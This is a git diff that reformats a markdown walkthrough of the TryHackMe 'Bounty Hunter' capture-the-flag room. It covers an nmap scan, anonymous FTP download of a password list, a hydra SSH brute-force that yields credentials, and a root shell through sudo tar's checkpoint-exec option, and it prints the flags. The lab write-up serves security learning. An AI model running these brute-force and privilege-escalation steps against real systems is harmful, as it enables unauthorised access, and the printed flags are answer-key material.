@@ -1,42 +1,39 @@
----
-title: 'TryHackMe: Bounty Hunter'
-created: '2020-09-09T21:22:42.037Z'
-modified: '2020-09-09T22:10:02.482Z'
----
-
 # TryHackMe: Bounty Hunter
 
-## Task 1 ###
+## Task 1
 
-### 1. Deploy ### 
-`-`
-### 2. Find all open ports on machine ###
-`nmap -A -p- target.thm -v` 
- ```
+### 1. Deploy
+
+If you need help with this, goto the support section.
+
+### 2. Find all open ports on machine
+
+`nmap -A -p- target.thm -v`
+
+```shell-session
 Scanning target.thm (10.10.237.73) [65535 ports]
     Discovered open port 22/tcp on 10.10.237.73
     Discovered open port 21/tcp on 10.10.237.73
     Discovered open port 80/tcp on 10.10.237.73
 ```
+
 Ports are:
+
 - `22, SSH`
 - `21, FTP`
 - `80, HTTP`
 
-### 3. Who wrote the task list? ###
+### 3. Who wrote the task list
 
-Navigate to host `10.10.237.73`.
+Navigate to host `10.10.237.73`. There's some blurb there giving a light backstory/context to the engagement.
 
-- Blurb about 4 characters:
-    - `Spike`
-    - `Jet`
-    - `Ed`
-    - `Faye`
+#### Test FTP for anon access
 
-#### Test FTP for anon access ####
 `ftp 10.10.237.73`, use username `Anonymous`, with a blank password.
-##### Login works #####
-```
+
+##### Login works
+
+```shell-session
 kali@kali:~/Desktop/TryHackMe/cowboyhacker$ ftp 10.10.237.73
 Connected to 10.10.237.73.
 220 (vsFTPd 3.0.3)
@@ -44,11 +41,12 @@ Name (10.10.237.73:kali): Anonymous
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp> 
+ftp>
 ```
 
-##### Check files in dir, and download them #####
-```
+##### Check files in dir, and download them
+
+```shell-session
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -69,10 +67,13 @@ local: task.txt remote: task.txt
 68 bytes received in 0.06 secs (1.1806 kB/s)
 
 ```
-##### Read stolen files #####
+
+##### Read stolen files
+
 `locks.txt` (seems like a list of passwords...)
-```
-kali@kali:~/Desktop/TryHackMe/cowboyhacker$ cat locks.txt 
+
+```shell-session
+kali@kali:~/Desktop/TryHackMe/cowboyhacker$ cat locks.txt
 rEddrAGON
 ReDdr4g0nSynd!cat3
 Dr@gOn$yn9icat3
@@ -100,29 +101,33 @@ rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
 ```
+
 `cat task.txt` (the task list for the _flag_)
-```
+
+```shell-session
 kali@kali:~/Desktop/TryHackMe/cowboyhacker$ cat task.txt  
 1.) Protect Vicious.  
-2.) Plan for Red Eye pickup on the moon.    
--lin                
+2.) Plan for Red Eye pickup on the moon.
+-lin
 ```
-### 4. What service can you bruteforce with the text file found? ###
+
+### 4. What service can you bruteforce with the text file found
 
 There were only 3 ports open on the scan, of which they're used for the either FTP, SSH, HTTP. We could brute FTP, but we'd have less capability; HTTP, not really brutable with what we've uncovered so far; so SSH, seems like the best option.
 
-### 5. What is the users password?
+### 5. What is the users password
 
-Lets assume: 
-Username: `lin`
-Password file: `locks.txt`
+Lets assume the following:
+    Username: `lin`
+    Password file: `locks.txt`
 
-And bruteforce with `hydra -l lin -P ~/Desktop/TryHackMe/cowboyhacker/locks.txt ssh://target.thm`
+And bruteforce with:
+    `hydra -l lin -P ~/Desktop/TryHackMe/cowboyhacker/locks.txt ssh://target.thm`
 
-```
+```shell-session
 kali@kali:~/Desktop/TryHackMe/cowboyhacker$ hydra -l lin -P ~/Desktop/TryHackMe/cowboyhacker/locks.txt ssh://target.thm
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                           
-                                                                                                                                                                                                                                          
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-09 17:51:32
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
@@ -144,7 +149,7 @@ Lets `ssh` into the box with our cracked credentials `lin:RedDr4gonSynd1cat3`.
 
 `ssh lin@target.thm`
 
-```
+```shell-session
 kali@kali:~/Desktop/TryHackMe/cowboyhacker$ ssh lin@10.10.237.73
 The authenticity of host '10.10.237.73 (10.10.237.73)' can't be established.
 ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
@@ -169,7 +174,7 @@ lin@bountyhacker:~/Desktop$
 
 Then we need to find and return `user.txt`.
 
-```
+```shell-session
 lin@bountyhacker:~/Desktop$ ls
 user.txt
 lin@bountyhacker:~/Desktop$ cat user.txt
@@ -177,16 +182,17 @@ THM{CR1M3_SyNd1C4T3}
 ```
 
 ### 7. root.txt
+
 Lets assume the `root.txt` is in the `/root` directory and `ls` it to see if we can see anything there.
 
-```
+```shell-session
 lin@bountyhacker:~/Desktop$ ls /root
 ls: cannot open directory '/root': Permission denied
 ```
 
 We don't have permission, so need to find a privesc. Lets start with using `sudo -l` to identify any root priviledged binaries we may have assigned.
 
-```
+```shell-session
 lin@bountyhacker:~/Desktop$ sudo -l
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
@@ -202,7 +208,7 @@ Lets 'create' a tar compressed archive. We'll use `/dev/null` for input and outp
 
 `sudo tar -c /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
-```
+```shell-session
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # whoami
@@ -212,14 +218,9 @@ root
 
 Successfully achieved a root shell. Lets try find that last flag.
 
-```
+``` bash
 # ls /root
 root.txt
 # cat /root/root.txt
 THM{80UN7Y_h4cK3r}
 ```
-
-
-
-
-
